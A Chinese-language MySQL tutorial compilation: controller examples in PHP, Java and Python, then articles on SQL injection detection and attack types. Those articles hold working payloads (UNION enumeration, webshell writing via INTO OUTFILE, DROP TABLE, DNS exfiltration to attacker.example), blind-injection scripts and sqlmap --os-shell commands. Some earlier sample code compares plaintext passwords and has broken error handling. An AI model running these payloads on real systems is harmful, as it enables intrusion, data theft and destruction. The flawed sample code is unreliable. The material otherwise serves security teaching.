  $stmt = $this->pdo->prepare("DELETE FROM users WHERE id = :id");
  return $stmt->execute(['id' => $id]);
  }
 }
```

### 2.2 基于Java的控制器实现

```java
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 public class UserController {
  private Connection connection;
  public UserController(Connection connection) {
  this.connection = connection;
  }
  // 获取用户列表
  public List<Map<String, Object>> getUsers() throws SQLException {
  List<Map<String, Object>> users = new ArrayList<>();
  String sql = "SELECT * FROM users";
  Statement stmt = connection.createStatement();
  ResultSet rs = stmt.executeQuery(sql);
  while (rs.next()) {
  Map<String, Object> user = new HashMap<>();
  user.put("id", rs.getInt("id"));
  user.put("name", rs.getString("name"));
  user.put("email", rs.getString("email"));
  users.add(user);
  }
  rs.close();
  stmt.close();
  return users;
  }
  // 根据ID获取用户
  public Map<String, Object> getUserById(int id) throws SQLException {
  Map<String, Object> user = new HashMap<>();
  String sql = "SELECT * FROM users WHERE id = ?";
  PreparedStatement pstmt = connection.prepareStatement(sql);
  pstmt.setInt(1, id);
  ResultSet rs = pstmt.executeQuery();
  if (rs.next()) {
  user.put("id", rs.getInt("id"));
  user.put("name", rs.getString("name"));
  user.put("email", rs.getString("email"));
  }
  rs.close();
  pstmt.close();
  return user;
  }
  // 创建新用户
  public boolean createUser(String name, String email) throws SQLException {
  String sql = "INSERT INTO users (name, email) VALUES (?, ?)";
  PreparedStatement pstmt = connection.prepareStatement(sql);
  pstmt.setString(1, name);
  pstmt.setString(2, email);
  int result = pstmt.executeUpdate();
  pstmt.close();
  return result > 0;
  }
  // 更新用户信息
  public boolean updateUser(int id, String name, String email) throws SQLException {
  String sql = "UPDATE users SET name = ?, email = ? WHERE id = ?";
  PreparedStatement pstmt = connection.prepareStatement(sql);
  pstmt.setString(1, name);
  pstmt.setString(2, email);
  pstmt.setInt(3, id);
  int result = pstmt.executeUpdate();
  pstmt.close();
  return result > 0;
  }
  // 删除用户
  public boolean deleteUser(int id) throws SQLException {
  String sql = "DELETE FROM users WHERE id = ?";
  PreparedStatement pstmt = connection.prepareStatement(sql);
  pstmt.setInt(1, id);
  int result = pstmt.executeUpdate();
  pstmt.close();
  return result > 0;
  }
 }
```

### 2.3 基于Python的控制器实现

```python
 import mysql.connector
 from mysql.connector import Error
 class UserController:
  def __init__(self, connection):
  self.connection = connection
  # 获取用户列表
  def get_users(self):
  users = []
  try:
  cursor = self.connection.cursor(dictionary=True)
  cursor.execute("SELECT * FROM users")
  users = cursor.fetchall()
  cursor.close()
  except Error as e:
  print(f"Error: {e}")
  return users
  # 根据ID获取用户
  def get_user_by_id(self, user_id):
  user = None
  try:
  cursor = self.connection.cursor(dictionary=True)
  cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
  user = cursor.fetchone()
  cursor.close()
  except Error as e:
  print(f"Error: {e}")
  return user
  # 创建新用户
  def create_user(self, name, email):
  try:
  cursor = self.connection.cursor()
  cursor.execute("INSERT INTO users (name, email) VALUES (%s, %s)", (name, email))
  self.connection.commit()
  cursor.close()
  return
  except Error as e:
  print(f"Error: {e}")
  self.connection.rollback()
  return False
  # 更新用户信息
  def update_user(self, user_id, name, email):
  try:
  cursor = self.connection.cursor()
  cursor.execute("UPDATE users SET name = %s, email = %s WHERE id = %s", (name, email, user_id))
  self.connection.commit()
  cursor.close()
  return
  except Error as e:
  print(f"Error: {e}")
  self.connection.rollback()
  return False
  # 删除用户
  def delete_user(self, user_id):
  try:
  cursor = self.connection.cursor()
  cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))
  self.connection.commit()
  cursor.close()
  return
  except Error as e:
  print(f"Error: {e}")
  self.connection.rollback()
  return False
```

## 3. 控制器设计模式 | Design Patterns

### 3.1 MVC 模式

MVC (Model-View-Controller) 是一种常用的软件架构模式，将应用分为三个核心组件：

- **Model**：数据模型，负责数据的存储和处理
- **View**：视图，负责数据的展示
- **Controller**：控制器，负责处理用户请求并协调Model和View
  在MySQL应用中，MVC模式的应用如下：

```
 +
 | | | | | |
 | View | <-> | Controller | <-> | Model |
 | | | | | |
 +
```

### 3.2 Repository 模式

Repository模式将数据访问逻辑与业务逻辑分离，通过抽象接口定义数据操作，提高代码的可测试性和可维护性。

```java
 // 定义用户仓库接口
 public interface UserRepository {
  List<User> findAll();
  User findById(int id);
  void save(User user);
  void update(User user);
  void delete(int id);
 }
 // MySQL实现
 public class MySQLUserRepository implements UserRepository {
  private Connection connection;
  // 实现方法...
 }
 // 控制器使用仓库
 public class UserController {
  private UserRepository userRepository;
  public UserController(UserRepository userRepository) {
  this.userRepository = userRepository;
  }
  // 方法实现...
 }
```

### 3.3 Service 层模式

在复杂应用中，通常会在控制器和数据访问层之间添加Service层，负责处理复杂的业务逻辑。

```java
 // 服务接口
 public interface UserService {
  List<User> getUsers();
  User getUserById(int id);
  boolean createUser(User user);
  boolean updateUser(User user);
  boolean deleteUser(int id);
 }
 // 服务实现
 public class UserServiceImpl implements UserService {
  private UserRepository userRepository;
  // 实现方法...
 }
 // 控制器使用服务
 public class UserController {
  private UserService userService;
  public UserController(UserService userService) {
  this.userService = userService;
  }
  // 方法实现...
 }
```

## 4. 控制器与数据库交互 | Database Interaction

### 4.1 连接管理

- **连接池**：使用连接池管理数据库连接，提高性能和资源利用率
- **连接关闭**：确保在使用完毕后关闭连接，防止资源泄漏
- **事务管理**：使用事务确保数据操作的原子性、一致性、隔离性和持久性

### 4.2 SQL 预处理

使用预处理语句防止SQL注入攻击：

```java
 // 不安全的方式
 String sql = "SELECT * FROM users WHERE name = '" + userName + "'";
 // 安全的方式
 String sql = "SELECT * FROM users WHERE name = ?";
 PreparedStatement pstmt = connection.prepareStatement(sql);
 pstmt.setString(1, userName);
```

### 4.3 错误处理

合理处理数据库操作中的错误，确保应用的稳定性：

```java
 try {
  // 数据库操作
 }
  // 错误处理
  logger.error("Database error: " + e.getMessage());
  // 可能的重试逻辑
 }
  // 资源清理
  if (pstmt != null) pstmt.close();
  if (rs != null) rs.close();
 }
```

## 5. 最佳实践 | Best Practices

### 5.1 性能优化

- **索引优化**：为常用查询字段创建索引
- **查询优化**：避免SELECT \*，只选择需要的字段
- **批量操作**：使用批量插入和更新提高性能
- **缓存策略**：使用缓存减少数据库访问

### 5.2 安全性

- **参数化查询**：防止SQL注入
- **权限控制**：使用最小权限原则
- **加密存储**：对敏感数据进行加密
- **审计日志**：记录关键操作

### 5.3 代码组织

- **分层架构**：清晰的分层结构
- **模块化设计**：将功能划分为模块
- **代码复用**：提取通用逻辑
- **文档注释**：完善的文档和注释

## 6. 实例应用 | Practical Application

### 6.1 完整的用户管理系统

下面是一个基于Java的完整用户管理系统示例：

#### 6.1.1 数据库表结构

```sql
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(50) NOT NULL,
  email VARCHAR(100) UNIQUE NOT NULL,
  password VARCHAR(100) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
 )
```

#### 6.1.2 模型类

```java
 public class User {
  private int id;
  private String name;
  private String email;
  private String password;
  private Timestamp createdAt;
  private Timestamp updatedAt;
  // 构造方法、getter和setter...
 }
```

#### 6.1.3 仓库接口

```java
 public interface UserRepository {
  List<User> findAll();
  User findById(int id);
  User findByEmail(String email);
  void save(User user);
  void update(User user);
  void delete(int id);
 }
```

#### 6.1.4 仓库实现

```java
 public class MySQLUserRepository implements UserRepository {
  private Connection connection;
  public MySQLUserRepository(Connection connection) {
  this.connection = connection;
  }
  @Override
  public List<User> findAll() {
  List<User> users = new ArrayList<>();
  try {
  String sql = "SELECT * FROM users";
  Statement stmt = connection.createStatement();
  ResultSet rs = stmt.executeQuery(sql);
  while (rs.next()) {
  User user = new User();
  user.setId(rs.getInt("id"));
  user.setName(rs.getString("name"));
  user.setEmail(rs.getString("email"));
  user.setPassword(rs.getString("password"));
  user.setCreatedAt(rs.getTimestamp("created_at"));
  user.setUpdatedAt(rs.getTimestamp("updated_at"));
  users.add(user);
  }
  rs.close();
  stmt.close();
  } catch (SQLException e) {
  e.printStackTrace();
  }
  return users;
  }
  // 其他方法实现...
 }
```

#### 6.1.5 服务层

```java
 public interface UserService {
  List<User> getUsers();
  User getUserById(int id);
  User getUserByEmail(String email);
  boolean createUser(User user);
  boolean updateUser(User user);
  boolean deleteUser(int id);
  boolean authenticate(String email, String password);
 }
 public class UserServiceImpl implements UserService {
  private UserRepository userRepository;
  public UserServiceImpl(UserRepository userRepository) {
  this.userRepository = userRepository;
  }
  @Override
  public List<User> getUsers() {
  return userRepository.findAll();
  }
  // 其他方法实现...
  @Override
  public boolean authenticate(String email, String password) {
  User user = userRepository.findByEmail(email);
  return user != null && user.getPassword().equals(password);
  }
 }
```

#### 6.1.6 控制器

```java
 public class UserController {
  private UserService userService;
  public UserController(UserService userService) {
  this.userService = userService;
  }
  public void handleRequest(String action, Map<String, String> params) {
  switch (action) {
  case "list":
  listUsers();
  break;
  case "view":
  viewUser(Integer.parseInt(params.get("id")));
  break;
  case "create":
  createUser(params.get("name"), params.get("email"), params.get("password"));
  break;
  case "update":
  updateUser(Integer.parseInt(params.get("id")), params.get("name"), params.get("email"), params.get("password"));
  break;
  case "delete":
  deleteUser(Integer.parseInt(params.get("id")));
  break;
  case "login":
  login(params.get("email"), params.get("password"));
  break;
  default:
  System.out.println("Invalid action");
  }
  }
  private void listUsers() {
  List<User> users = userService.getUsers();
  for (User user : users) {
  System.out.println(user.getId() + ": " + user.getName() + " (" + user.getEmail() + ")");
  }
  }
  // 其他方法实现...
 }
```

## 7. 总结 | Summary

控制器是MySQL应用中的重要组成部分，它连接用户界面与数据库，负责处理用户请求、执行业务逻辑、与数据库交互并返回处理结果。通过合理的设计模式和最佳实践，可以构建高效、安全、可维护的MySQL应用。
在实际开发中，应根据具体需求选择合适的控制器实现方式，并遵循相关的设计原则和最佳实践，以确保应用的质量和性能。

<!-- ============ 文档分隔线：020-mysql/077-SQLInjectionBasicsDetection.md ============ -->

## 1. SQL 注入概述 (Overview)

### 1.1 什么是 SQL 注入

SQL 注入（SQL Injection）是一种代码注入攻击技术，攻击者通过在应用程序的输入字段中插入恶意 SQL 代码，从而操纵数据库执行非预期的操作。这是 Web 应用程序中最常见、最危险的安全漏洞之一，位列 OWASP Top 10 之首。
**核心原理**：

- 应用程序将用户输入直接拼接到 SQL 查询语句中
- 攻击者利用这种拼接机制注入恶意 SQL 代码
- 数据库执行了攻击者构造的恶意查询
  **历史背景**：
  SQL 注入攻击最早于 1998 年被首次公开报道，当时一名黑客在 Web 应用程序中发现了这一漏洞。此后，SQL 注入成为最常见的 Web 攻击手段之一，给全球无数企业和组织造成了巨大的经济损失和声誉损害。

### 1.2 SQL 注入的危害

SQL 注入可能导致以下严重后果：

| 危害类型         | 说明                                           | 严重程度 |
| :--------------- | :--------------------------------------------- | :------- |
| **数据泄露**     | 获取敏感数据，如用户密码、个人信息、商业机密等 | 高       |
| **数据篡改**     | 修改、删除或插入数据库中的数据                 | 高       |
| **数据破坏**     | 删除表、清空数据甚至破坏整个数据库             | 极高     |
| **权限提升**     | 获取数据库管理员权限，控制服务器               | 极高     |
| **远程代码执行** | 在某些情况下执行操作系统命令                   | 极高     |
| **网站接管**     | 完全控制 Web 应用程序                          | 高       |
| **身份冒充**     | 以合法用户身份进行操作                         | 高       |
| **服务拒绝**     | 使数据库服务崩溃或无法正常使用                 | 中       |
| **实际案例**：   |

- 2017 年 Equifax 数据泄露事件：攻击者通过 SQL 注入漏洞获取了 1.43 亿用户的敏感信息
- 2018 年 Ticketmaster 数据泄露：超过 40000 名用户的支付信息被窃取
- 众多中小企业网站因 SQL 注入导致用户数据库被清空

### 1.3 SQL 注入的分类

SQL 注入可以按照不同的方式分类：

#### 1.3.1 按数据获取方式分类

- **带内注入（In-band）**：攻击者使用同一通道发送攻击和获取结果，最常见也最容易实施
- **盲注（Blind）**：无法直接获取查询结果，通过应用程序的行为推断，布尔盲注和时间盲注
- **带外注入（Out-of-band）**：使用不同的通道发送攻击和获取结果，如 DNS 通道

#### 1.3.2 按注入位置分类

- **GET 参数注入**：通过 URL 参数注入，最常见的注入点
- **POST 参数注入**：通过表单数据注入
- **Cookie 注入**：通过 Cookie 注入
- **HTTP 头注入**：通过 HTTP 请求头（如 User-Agent、X-Forwarded-For）注入
- **文件上传注入**：通过文件上传功能注入

#### 1.3.3 按数据库类型分类

- **MySQL 注入**：最常见的数据库注入
- **SQL Server 注入**：通常可利用 xp_cmdshell 执行系统命令
- **Oracle 注入**：可能利用 utl_http 包进行带外攻击
- **PostgreSQL 注入**：可能利用 COPY 命令读写文件

## 2. SQL 注入原理详解 (Principle)

### 2.1 基本原理示例

让我们通过一个简单的登录功能来理解 SQL 注入的原理。

#### 2.1.1 危险代码示例

```python
 # 危险代码：直接拼接用户输入
 def login(username, password):
  # 直接将用户输入拼接到 SQL 语句中
  sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  cursor.execute(sql)
  return cursor.fetchone()
```

**代码分析**：
这段代码的问题在于直接将用户输入拼接到 SQL 语句中，没有任何过滤或转义。当用户输入正常的用户名和密码时，查询正常工作。但如果攻击者输入特殊的字符或 SQL 语句，就可以破坏原有查询的逻辑。

#### 2.1.2 正常登录

```python
 # 正常登录
 login("admin", "123456")
 # 执行的 SQL：
 # SELECT * FROM users WHERE username = 'admin' AND password = '123456'
```

**执行流程**：

1. 用户输入用户名 "admin" 和密码 "123456"
2. 应用程序构建查询语句
3. 数据库执行查询，验证用户凭据
4. 返回查询结果

#### 2.1.3 SQL 注入攻击

```python
 # 攻击者使用特殊输入绕过登录
 login("admin' --", "anything")
 # 执行的 SQL：
 # SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 # 注释符 -- 后面的内容被忽略，只验证了 username = 'admin'
```

**攻击原理**：

1. 用户名输入 `admin' --`
2. 应用程序构建的 SQL 变为：`SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
3. 单引号闭合了原来的字符串
4. `--` 将后面的内容全部注释掉
5. 实际执行的查询变为：`SELECT * FROM users WHERE username = 'admin'`
6. 如果存在 admin 用户，攻击者即可绕过登录验证

### 2.2 SQL 注入的关键点

SQL 注入成功的关键要素：

1. **用户输入可控**：攻击者能够控制输入参数
2. **输入未经过滤**：应用程序没有对输入进行验证或转义
3. **输入直接拼接**：输入被直接拼接到 SQL 语句中
4. **错误信息暴露**：应用程序暴露了详细的数据库错误信息

### 2.3 SQL 注入的完整攻击流程

#### 2.3.1 信息收集阶段

攻击者首先需要收集目标系统的信息：

```sql
-- 1. 探测注入点是否存在：两次响应不同说明可能存在注入
1 AND 1=1
1 AND 1=2

-- 2. 探测数据库类型与版本
1' UNION SELECT VERSION(),2,3 -- 
1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) -- 

-- 3. 获取当前数据库名与用户
1' UNION SELECT DATABASE(),USER(),3 -- 
1' UNION SELECT 1,CURRENT_USER(),DATABASE() -- 
```

#### 2.3.2 数据库枚举阶段

```sql
-- 1. 枚举所有数据库
1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- 

-- 2. 枚举当前库的所有表
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 

-- 3. 枚举目标表的列
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 

-- 4. 读取敏感数据
1' UNION SELECT 1,username,password FROM users -- 
```

#### 2.3.3 权限提升阶段

```sql
-- 1. 查看当前用户权限
1' UNION SELECT 1,2,GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE GRANTEE=CONCAT("'",USER(),"'") -- 

-- 2. 尝试读取文件（需要 FILE 权限）
1' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') -- 

-- 3. 尝试写入 WebShell（需要 FILE 权限且 secure_file_priv 允许）
1' UNION SELECT 1,0x3C3F70687020706870696E666F28293B3F3E,3 INTO OUTFILE '/var/www/html/info.php' -- 

-- 4. 具备条件时可尝试通过 UDF 插件执行系统命令
SELECT sys_eval('whoami'); -- 需要已安装的 UDF 扩展
```

## 3. SQL 注入检测方法 (Detection Methods)

### 3.1 手动检测

#### 3.1.1 基础测试 Payload

```sql
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
" OR "a"="a
' --
" --
' #
" #
/* */
' OR 1=1 --
' OR '1'='1
1' OR '1'='1
' AND 1=1 --
' AND 1=2 --
1' AND 1=1 --
1' AND 1=2 --
1 AND 1=1
1 AND 1=2
' LIKE '%
%
' IN ('a', 'b') --
' UNION SELECT NULL --
' UNION SELECT 1,2 --
' UNION SELECT NULL, NULL --
```

#### 3.1.2 检测步骤

1. **识别输入点**：找出所有用户可控的输入

- URL 参数
- 表单数据
- Cookie
- HTTP 头

2. **基础测试**：输入单引号、双引号，观察响应

- 是否报错
- 错误信息是否暴露数据库细节

3. **Boolean 测试**：使用 AND 1=1 和 AND 1=2

- 两次响应是否不同
- 不同说明可能存在注入

4. **UNION 测试**：尝试 UNION 查询

- 确定列数
- 确定显示位置

5. **时间测试**：使用 SLEEP() 或 BENCHMARK()

- 如果响应延迟，说明存在注入

6. **错误测试**：输入可能导致错误的语句

- 观察错误信息

### 3.2 自动化检测工具

#### 3.2.1 SQLMap

SQLMap 是最流行的自动化 SQL 注入工具。

```bash
 # 基本用法
 sqlmap -u "http://example.com/product.php?id=1"
 # 测试 POST 请求
 sqlmap -u "http://example.com/login.php" --data="username=test&password=test"
 # 测试 Cookie
 sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"
 # 获取数据库
 sqlmap -u "http://example.com/product.php?id=1" --dbs
 # 获取表
 sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
 # 获取列
 sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name --columns
 # 获取数据
 sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name -C column1,column2 --dump
 # 获取 Shell
 sqlmap -u "http://example.com/product.php?id=1" --os-shell
 # 执行自定义 SQL
 sqlmap -u "http://example.com/product.php?id=1" --sql-query="SELECT * FROM users"
 # 批量测试
 sqlmap -m urls.txt
 # 使用 Tor 匿名网络
 sqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
```

#### 3.2.2 Burp Suite

```bash
 # 使用 Burp Suite 的 Intruder 模块
 # 1. 拦截请求
 # 2. 发送到 Intruder
 # 3. 设置 Payload
 # 4. 加载 SQL 注入 Payload 列表
 # 5. 分析响应
```

#### 3.2.3 其他工具

- **OWASP ZAP**：开源的 Web 应用安全扫描器
- **Havij**：图形化的 SQL 注入工具（仅支持 MySQL）
- **Sqlninja**：专门针对 SQL Server 的注入工具
- **NoSQLMap**：针对 NoSQL 数据库的注入工具

### 3.3 代码审计检测

#### 3.3.1 危险代码模式

```python
 # 危险模式 1：直接字符串拼接（f-string）
 sql = f"SELECT * FROM users WHERE id = {user_id}"
 # 危险模式 2：字符串拼接（+）
 sql = "SELECT * FROM users WHERE id = " + user_id
 # 危险模式 3：使用 % 格式化
 sql = "SELECT * FROM users WHERE id = %s" % user_id
 # 危险模式 4：使用 format()
 sql = "SELECT * FROM users WHERE id = {}".format(user_id)
 # 危险模式 5：没有参数化的存储过程调用
 cursor.callproc("get_user", (user_id,)) -- 取决于存储过程实现
```

#### 3.3.2 安全代码模式

```python
 # 安全模式 1：参数化查询
 sql = "SELECT * FROM users WHERE id = %s"
 cursor.execute(sql, (user_id,))
 # 安全模式 2：ORM 查询
 user = session.query(User).filter(User.id == user_id).first()
 # 安全模式 3：使用 SQLAlchemy
 result = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
```

#### 3.3.3 PHP 代码审计

```php
 // 危险代码
 $sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
 $result = mysqli_query($conn, $sql);
 // 安全代码
 $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
 $stmt->bind_param("s", $_POST['username']);
 $stmt->execute();
```

<!-- ============ 文档分隔线：020-mysql/078-SQLInjectionAttackTypePractice.md ============ -->

## 1. SQL 注入攻击类型 (Attack Types)

### 1.1 带内注入（In-band Injection）

带内注入是最常见和最容易实施的 SQL 注入类型，攻击者使用同一通道发送攻击和获取结果。

#### 1.1.1 基于错误的注入（Error-based）

利用数据库错误信息来获取数据，原理是构造会让数据库报错的表达式，并把目标数据拼进错误消息中回显。

**MySQL 示例**：

```sql
-- 假设 URL 参数：/product?id=1
-- EXTRACTVALUE 的 XPath 参数不合法时抛出错误，并附带 DATABASE() 的结果
1' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- 
-- 0x7e 是波浪号 ~，用于在错误信息中标记数据边界

-- 同样常用的还有 UPDATEXML
1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)), 1) -- 

-- 说明：EXTRACTVALUE / UPDATEXML 从 MySQL 5.1.5 开始提供，
-- 报错回显长度有限（约 32 字节），大量数据建议配合 SUBSTRING 分段获取
```

**SQL Server 示例**：

```sql
-- 将版本信息强制转换为 int，转换失败时在错误消息中回显 @@version
1' AND 1=CONVERT(int, @@version) -- 

-- 也可以逐条获取库名
1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases)) -- 
```

#### 1.1.2 UNION 查询注入

利用 UNION 操作符将恶意查询结果合并到正常查询中。

**前提条件**：

- 原查询与恶意查询的列数必须相同
- 对应位置的数据类型必须兼容

**攻击步骤**：

```sql
-- 步骤 1：确定列数（ORDER BY 逐次递增，直到报错）
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
1' ORDER BY 4 --   -- 报错，说明原查询只有 3 列

-- 也可以用 UNION SELECT NULL 逐次试探列数
1' UNION SELECT NULL -- 
1' UNION SELECT NULL,NULL -- 
1' UNION SELECT NULL,NULL,NULL --   -- 成功，确定列数为 3

-- 步骤 2：确定页面回显位置
1' UNION SELECT 1,2,3 -- 
-- 观察页面上 1、2、3 哪个位置显示出来了

-- 步骤 3：获取数据库信息
1' UNION SELECT 1,DATABASE(),USER() -- 

-- 步骤 4：获取表名（GROUP_CONCAT 有长度限制，默认 1024 字节）
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 

-- 步骤 5：获取列名
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 

-- 步骤 6：获取用户数据
1' UNION SELECT 1,username,password FROM users -- 
```

#### 1.1.3 堆叠查询注入（Stacked Queries）

允许在一个查询中执行多条 SQL 语句，分号后可以继续追加任意语句。

```sql
-- 时间延迟验证
1'; SELECT SLEEP(5); -- 

-- 写入数据
1'; INSERT INTO users(username,password) VALUES('hacker','hack'); -- 

-- 危险操作（仅教学演示，切勿在真实环境执行）
1'; DROP TABLE users; -- 

-- 说明：堆叠查询依赖数据库驱动支持多语句执行（如 PHP mysqli 默认支持，
-- PDO 默认不支持）；追加的语句一般没有回显，常配合时间盲注或写文件利用
```

### 1.2 盲注（Blind Injection）

当应用程序不返回数据库错误信息时，攻击者需要通过其他方式推断数据。

#### 1.2.1 布尔盲注（Boolean Blind）

通过应用程序的响应差异来推断数据。

**判断逻辑**：

- 如果注入条件为真，页面正常显示
- 如果注入条件为假，页面显示不同或报错

```sql
-- 判断数据库名长度是否大于 0
1' AND LENGTH(DATABASE())>0 -- 

-- 判断数据库名第一个字符是否为 s
1' AND SUBSTRING(DATABASE(),1,1)='s' -- 

-- 用 ASCII 比较二分猜解（更高效）
1' AND ASCII(SUBSTRING(DATABASE(),1,1))>100 -- 

-- 判断是否存在 users 表
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='users')>0 -- 
```

**自动化脚本**：

```python
import requests


def boolean_blind_injection(url):
    """布尔盲注：根据页面响应差异逐字符猜解数据库名。"""
    # 1. 猜解数据库名长度
    db_name_length = 0
    for i in range(1, 30):
        payload = f"1' AND LENGTH(DATABASE())={i} -- "
        response = requests.get(url, params={"id": payload})
        if "正常" in response.text:
            db_name_length = i
            print(f"数据库名长度：{i}")
            break

    # 2. 逐字符猜解数据库名
    db_name = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    for pos in range(1, db_name_length + 1):
        for char in charset:
            payload = f"1' AND SUBSTRING(DATABASE(), {pos}, 1)='{char}' -- "
            response = requests.get(url, params={"id": payload})
            if "正常" in response.text:
                db_name += char
                print(f"第 {pos} 个字符：{char}")
                break

    print(f"数据库名：{db_name}")
    return db_name
```

#### 1.2.2 时间盲注（Time-based）

利用数据库延迟函数，通过响应时间来推断数据，适用于页面响应无差异的场景。

```sql
-- 判断注入点是否存在：响应延迟约 5 秒则成立
1' AND SLEEP(5) -- 

-- 条件成立时延迟 3 秒，用于逐字符猜解
1' AND IF(SUBSTRING(DATABASE(),1,1)='s',SLEEP(3),0) -- 
```

**时间盲注脚本**：

```python
import requests
import time


def time_based_injection(url):
    """时间盲注：通过响应延迟逐字符猜解数据库名。"""
    # 1. 先测试是否存在时间盲注
    payload = "1' AND SLEEP(5) -- "
    start_time = time.time()
    requests.get(url, params={"id": payload})
    end_time = time.time()
    if end_time - start_time < 5:
        print("不存在时间盲注")
        return ""
    print("存在时间盲注！")

    # 2. 逐字符猜解数据库名
    db_name = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    for pos in range(1, 20):
        found = False
        for char in charset:
            payload = f"1' AND IF(SUBSTRING(DATABASE(), {pos}, 1)='{char}', SLEEP(3), 0) -- "
            start_time = time.time()
            requests.get(url, params={"id": payload})
            end_time = time.time()
            if end_time - start_time >= 3:
                db_name += char
                found = True
                print(f"第 {pos} 个字符：{char}")
                break
        if not found:
            break  # 当前字符长度已猜完

    print(f"数据库名：{db_name}")
    return db_name
```

### 1.3 二次注入（Second-order Injection）

恶意数据被存储在数据库中，之后在其他查询中被使用时触发注入。存储阶段不会触发，因为数据只是作为字符串写入；触发阶段再次拼接该数据时才产生注入。

**攻击场景**：

1. **存储阶段**：攻击者注册用户名 `admin' --`，系统将其存储到数据库
2. **触发阶段**：其他功能使用该用户名时，如修改密码的 SQL 查询

```python
# 1. 用户注册时输入恶意数据
def register(username, password):
    sql = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
    cursor.execute(sql)
    # 此时不会触发注入，因为只是把字符串写入数据库

# 2. 数据库中存储的值：admin' --
# 3. 其他功能拼接该值查询时触发注入
def get_user_profile(username):
    sql = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(sql)
    return cursor.fetchone()

# 4. 攻击者以 admin' -- 用户名登录后调用 get_user_profile
#    实际执行：SELECT * FROM users WHERE username = 'admin' --'
#    注释符后的内容被忽略，返回真正的 admin 用户信息
```

**实际案例**：
WordPress 插件中曾发现过二次注入漏洞，攻击者通过评论功能注入恶意代码，该代码在管理员查看评论时执行。

### 1.4 宽字节注入（Wide Byte Injection）

利用字符编码漏洞进行注入。

**原理**：

- 应用程序使用 `addslashes()` 或类似函数转义单引号，在引号前添加反斜杠 `\`（0x5c）
- 如果数据库连接使用宽字节编码（如 GBK），`0xbf5c` 或 `0xdf5c` 会被解析成一个宽字符，反斜杠被"吃掉"，后面的单引号失去转义

```sql
-- 输入 %bf%27（%27 是单引号），addslashes 处理后变成 %bf%5c%27
-- GBK 把 %bf%5c 解析为一个宽字符，%27 成为未转义的单引号
1%bf%27 UNION SELECT 1,2,3 -- 

-- 另一种常见写法是 %df%27
1%df%27 UNION SELECT 1,DATABASE(),USER() -- 

-- 说明：MySQL 5.7+ 配合 PHP 7+ 使用 UTF-8 连接时该场景已很少出现，
-- 但遗留系统（GBK 连接、addslashes 转义）仍可能存在
```

**防御方法**：

- 统一使用 UTF-8 编码，并将 `character_set_client` 设置为 `binary`，避免宽字节吸收反斜杠
- 使用参数化查询而不是字符串拼接
- 不要依赖 `addslashes()` 等转义函数作为唯一防线

### 1.5 联合注入（Union-based Injection）

详见 1.1.2 节。

### 1.6 带外注入（Out-of-band Injection）

当常规渠道（带内）无法获取数据时，使用 DNS、HTTP 等替代通道回传数据。

```sql
-- MySQL 经典做法：Windows 环境下用 LOAD_FILE 触发 UNC 路径请求，
-- 让数据库向攻击者控制的域名发起 DNS 查询，数据以子域名形式出现在 DNS 日志中
1' AND LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1), '.attacker.example\\x')) -- 

-- 说明：
-- 1. 需要 FILE 权限，且目标为 Windows（UNC 路径才有效）
-- 2. MySQL 8.0 没有内置 HTTP 请求函数，其他 OOB 方式需要 UDF 扩展
-- 3. 实际利用条件苛刻，多数场景优先使用盲注替代
```

## 2. SQL 注入实战案例 (Practical Cases)

### 2.1 案例 1：绕过登录验证

#### 2.1.1 场景描述

一个简单的登录页面，用户输入用户名和密码。

#### 2.1.2 危险代码

```php
<?php
// 危险代码：直接拼接用户输入
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    echo "登录成功！";
} else {
    echo "登录失败！";
}
?>
```

#### 2.1.3 攻击 Payload

```
用户名：admin' --
密码：任意值
```

#### 2.1.4 执行的 SQL

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

#### 2.1.5 结果分析

